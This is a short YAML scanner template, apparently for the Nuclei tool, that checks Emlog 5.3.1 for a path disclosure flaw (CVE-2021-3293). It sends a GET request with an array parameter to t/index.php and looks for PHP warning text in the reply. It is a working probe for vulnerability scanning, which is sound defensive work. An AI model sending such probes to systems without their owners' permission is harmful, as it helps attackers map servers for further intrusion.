id: emlog-path-disclosure
info:
  name: Emlog 5.3.1 Path Disclosure (CVE-2021-3293)
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    Emlog 5.3.1 has a path disclosure vulnerability in `t/index.php`, allowing attackers to view the webroot or file path.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-3293
http:
  - raw:
      - |
        GET /t/index.php?action[]=aaaa HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Warning"
          - "on line"
        part: body
